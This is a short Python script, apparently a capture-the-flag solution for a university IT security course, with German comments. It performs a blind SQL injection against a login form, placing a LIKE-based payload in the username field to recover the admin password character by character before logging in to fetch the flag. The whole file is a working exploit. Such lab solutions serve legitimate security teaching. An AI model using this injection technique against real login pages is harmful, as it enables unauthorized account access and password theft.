import re
import requests

# 1. durchgehen bis password gefunden
# 2. jeden einzelnen character probieren
# 3. sobald richtigen gefunden, direkt zum nächsten
# 4. wenn alle chars durch und keiner mehr passt abbrechen

URL = "https://t06-49ff47ac57d4b03c.itsec.sec.in.tum.de/"
CHARS = "0123456789abcdef"

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:
    password = ""
    running = True
    while running:
        for c in CHARS:
            data = {"username": 'admin" AND password LIKE "{}%" --'.format(password + c), "password": password + c}
            response = sess.post(URL, data=data)

            # Check if select returned a row
            if re.search(r' I20 ', response.text):
                password = password + c
                break
        else:
            data = {"username": "admin","password": password}
            response = sess.post(URL, data=data)
            flag = extract_flag_from_string(response.text)
            
            if flag: print(flag)
            else: print("No flag found! Change character set.")
            running = False